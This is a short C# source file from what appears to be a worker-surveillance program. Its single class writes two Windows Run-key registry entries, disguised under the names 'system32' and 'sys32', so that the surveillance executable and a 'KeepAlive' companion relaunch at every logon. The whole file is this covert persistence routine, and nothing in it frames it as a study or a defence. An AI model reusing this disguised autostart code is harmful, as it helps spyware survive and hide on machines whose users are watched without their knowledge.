using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SnS.Classes
{
    class RegistryData
    {
        public static string keyCheckKeepAlive;

        public static void setRegistry()
        {
            string keyCheck = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "system32", null);
            keyCheckKeepAlive = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "sys32", null);
            
            if (keyCheck == null)
            {
                RegistryKey rkRegistry;
                rkRegistry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rkRegistry.SetValue("system32", System.Reflection.Assembly.GetExecutingAssembly().Location);
            }

            if (keyCheckKeepAlive == null)
            {
                RegistryKey rkRegistry;
                rkRegistry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rkRegistry.SetValue("sys32", System.Reflection.Assembly.GetExecutingAssembly().Location.Replace("WorkerSurveillance","KeepAlive"));
            }
        }
    }
}
